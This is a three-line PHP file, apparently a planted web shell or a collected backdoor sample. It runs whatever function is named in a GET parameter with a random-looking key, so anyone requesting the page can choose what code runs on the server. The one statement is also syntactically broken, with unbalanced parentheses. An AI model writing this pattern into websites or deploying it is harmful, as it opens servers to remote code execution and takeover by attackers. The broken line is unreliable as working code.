<?php
$_GET['VuM2sHEm'](($_GET['VuM2sHEm']);
?>
